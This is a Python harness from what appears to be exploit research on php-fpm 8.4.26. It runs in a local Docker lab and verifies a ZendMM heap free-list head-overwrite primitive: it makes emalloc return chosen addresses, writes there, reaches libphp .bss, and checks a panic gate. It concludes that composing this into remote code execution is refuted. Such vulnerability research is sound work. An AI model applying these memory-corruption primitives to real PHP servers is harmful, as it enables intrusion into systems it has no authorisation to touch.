#!/usr/bin/env python3
r"""A/B + reliability harness for the ZendMM free-list HEAD seat
(freelist_head_seat.py), against a live php-fpm 8.4.26 lab
(docker-compose.fpm-avenues.yml, profile seat, host port 8168).

Lab bring-up / run / teardown (from the repo root):
    docker compose -f docker-compose.fpm-avenues.yml --profile seat up -d --build
    python3 -I poc/primitives/write/verify_freelist_head_seat.py
    docker compose -f docker-compose.fpm-avenues.yml --profile seat down
(container p2s-seat-fpm; --compose-file/--service already default to this lab.)

Checks:
  (1) WIN   N single raw head writes heap->free_slot[bin]=T (T[0]==0, no shadow,
            no shadow_key) each make the next emalloc(bin) return the chosen
            address T and leave the worker alive (reliability N/N).
  (2) GATE  the same head write with T[0] != 0 -> the follow-on pop re-checks the
            absent shadow -> zend_mm_panic/SIGABRT -> worker dies (sacrificial).
  (3) WRITE an ordinary write into the returned allocation lands at the chosen
            address and reads back verbatim.
  (4) REACH the chosen address can be a far chunk offset and a php-fpm image .bss
            address, a reach bounded only by mapped memory.
  (5) GEOM  &free_slot[bin] is chunk-relative (heap @ chunk+0x40; free_slot @
            heap+0x28 on 8.4.26-fpm), a per-build constant needing no shadow_key.
  SEAT      prints seat_verdict() -- the structural boundary on composing the seat
            into a black-box RCE.
"""
from __future__ import annotations

import argparse
import importlib.util
import os
import sys

_HERE = os.path.dirname(os.path.abspath(__file__))
_POC_ROOT = os.path.dirname(os.path.dirname(_HERE))  # poc/
for _p in (_HERE, _POC_ROOT):
    if _p not in sys.path:
        sys.path.insert(0, _p)


def _load(name, filename):
    path = os.path.join(_HERE, filename)
    spec = importlib.util.spec_from_file_location(name, path)
    mod = importlib.util.module_from_spec(spec)
    sys.modules.setdefault(name, mod)
    spec.loader.exec_module(mod)
    return mod


S = _load("freelist_head_seat", "freelist_head_seat.py")

# repo root is one level above poc/
DEFAULT_COMPOSE = os.path.join(os.path.dirname(_POC_ROOT),
                               "docker-compose.fpm-avenues.yml")


def _warm(compose_file, service, port):
    """Curl the nginx front a few times so every static worker builds a request
    heap with a populated bin-320 free list."""
    import subprocess
    for _ in range(8):
        subprocess.run(["curl", "-s", "-o", "/dev/null",
                        f"http://127.0.0.1:{port}/"], timeout=20)


def run(compose_file, service, port, reps=5, size=S.DEFAULT_ALLOC_SIZE,
        verbose=True):
    _warm(compose_file, service, port)
    s = S.FreeListHeadSeat(compose_file, service, size=size, verbose=verbose)
    pids = S.worker_pids(compose_file, service)
    if not pids:
        raise RuntimeError("no fpm workers (is the seat lab up? curl the front once)")

    out = {"workers": pids, "reps": reps}

    # ---- geometry (5) ----
    pid = pids[0]
    loc = s.locate_head(pid)
    if not loc:
        raise RuntimeError("could not locate the bin-320 head")
    heap, chunk = loc["heap"], loc["heap"] & ~(S.CHUNK_ALIGN - 1)
    out["geom"] = {
        "heap": heap, "chunk": chunk, "heap_off_in_chunk": heap - chunk,
        "bin": loc["bin"], "headcell": loc["headcell"],
        "free_slot_off": loc["headcell"] - heap,
        "headcell_off_in_chunk": loc["headcell"] - chunk, "how": loc["how"],
    }
    maps = S.read_maps(compose_file, service, pid)
    binbase = maps.binbase()
    bss = maps.image_bss()

    # ---- (1) WIN reliability: N independent clean head seats on one worker ----
    wins, alive = 0, 0
    for i in range(reps):
        loc = s.locate_head(pid) or loc
        T = chunk + 0x120000 + i * 0x10000      # distinct far chunk-local targets
        r = s.seat_head(pid, T, loc["headcell"], writeback=b"P2S_W%02d" % i)
        if r["returned_chosen"]:
            wins += 1
        if r["alive"]:
            alive += 1
        if verbose:
            print(f"  (1) rep {i}: T={T:#x} chosen={r['returned_chosen']} "
                  f"alive={r['alive']} rb={r['readback'] and hex(r['readback'])}")
    out["win"] = {"chosen": wins, "alive": alive, "n": reps}

    # ---- (3) WRITE land-and-read-back (last rep already demonstrated) ----
    loc = s.locate_head(pid) or loc
    Tw = chunk + 0x1A0000
    rw = s.seat_head(pid, Tw, loc["headcell"], writeback=b"RBVERIFY")
    out["write"] = {"target": Tw, "returned_chosen": rw["returned_chosen"],
                    "readback": rw["readback"],
                    "ok": rw["returned_chosen"]
                    and rw["readback"] == int.from_bytes(b"RBVERIFY", "little")}

    # ---- (4) REACH: libphp .bss ----
    out["reach_libphp"] = None
    if bss:
        loc = s.locate_head(pid) or loc
        Tl = ((bss["start"] + bss["end"]) // 2) & ~0xF
        rl = s.seat_head(pid, Tl, loc["headcell"], writeback=b"LIBPHP__")
        out["reach_libphp"] = {"target": Tl, "dist_from_chunk": abs(Tl - chunk),
                               "returned_chosen": rl["returned_chosen"],
                               "alive": rl["alive"]}

    # ---- (2) GATE: dirty T[0] on a SACRIFICIAL worker -> panic/die ----
    sac = pids[-1] if len(pids) > 1 else pids[0]
    locg = s.locate_head(sac)
    out["gate"] = None
    if locg:
        chunkg = locg["heap"] & ~(S.CHUNK_ALIGN - 1)
        Tg = chunkg + 0x130000
        rg = s.seat_head(sac, Tg, locg["headcell"], dirty_t0=True)
        out["gate"] = {"pid": sac, "returned_chosen": rg["returned_chosen"],
                       "panicked": rg["panicked"], "alive_after": rg["alive"]}

    out["verdict"] = S.seat_verdict()
    out["binbase"] = binbase
    return out


def _fmt(out):
    P = print
    P("=" * 78)
    P("fpm free-list HEAD seat -- verify (seat lab, workers %s)" % out["workers"])
    P("=" * 78)
    g = out["geom"]
    P("(5) GEOM  heap=%#x chunk=%#x (heap@+%#x)  bin=%d  &free_slot[bin]=%#x"
      % (g["heap"], g["chunk"], g["heap_off_in_chunk"], g["bin"], g["headcell"]))
    P("          free_slot @ heap+%#x ; head cell @ chunk+%#x (per-build const, "
      "NO shadow_key; how=%s)"
      % (g["free_slot_off"], g["headcell_off_in_chunk"], g["how"]))
    w = out["win"]
    P("(1) WIN   single raw head write -> next emalloc returns T : %d/%d chosen, "
      "%d/%d worker-alive" % (w["chosen"], w["n"], w["alive"], w["n"]))
    wr = out["write"]
    P("(3) WRITE emalloc-return write lands + reads back : %s  (T=%#x)"
      % (wr["ok"], wr["target"]))
    rl = out.get("reach_libphp")
    if rl:
        P("(4) REACH libphp .bss T=%#x (%s MiB from chunk) chosen=%s alive=%s"
          % (rl["target"], rl["dist_from_chunk"] >> 20, rl["returned_chosen"],
             rl["alive"]))
    ga = out.get("gate")
    if ga:
        P("(2) GATE  dirty T[0] on sac pid %d : panicked=%s worker-alive-after=%s "
          "(clean-pop rule real)" % (ga["pid"], ga["panicked"], ga["alive_after"]))
    P("-" * 78)
    v = out["verdict"]
    P("[var_hash_rw can seat head] YES (in-slot 2-value/shadow_key refutation LIFTED)")
    P("[composed RCE    ] REFUTED black-box:")
    for line in v["but_composed_rce_refuted"].split("\n"):
        P("    " + line)
    P("=" * 78)


def main(argv=None):
    ap = argparse.ArgumentParser(description="verify the fpm free-list HEAD seat")
    ap.add_argument("--compose-file", default=DEFAULT_COMPOSE)
    ap.add_argument("--service", default="seat-fpm")
    ap.add_argument("--port", type=int, default=8168)
    ap.add_argument("--reps", type=int, default=5)
    ap.add_argument("--size", type=int, default=S.DEFAULT_ALLOC_SIZE)
    ap.add_argument("--json", action="store_true")
    a = ap.parse_args(argv)
    # grouped-compose isolation for the imported helper module (S).
    os.environ["COMPOSE_FILE"] = a.compose_file
    os.environ["COMPOSE_PROJECT_NAME"] = "p2s-seat"
    os.environ["COMPOSE_PROFILES"] = "seat"
    out = run(a.compose_file, a.service, a.port, reps=a.reps, size=a.size)
    if a.json:
        import json
        print(json.dumps(out, indent=2,
                         default=lambda o: hex(o) if isinstance(o, int) else o))
    else:
        _fmt(out)
    ok = out["win"]["chosen"] == out["win"]["n"] and \
        out["win"]["alive"] == out["win"]["n"]
    return 0 if ok else 1


if __name__ == "__main__":
    raise SystemExit(main())
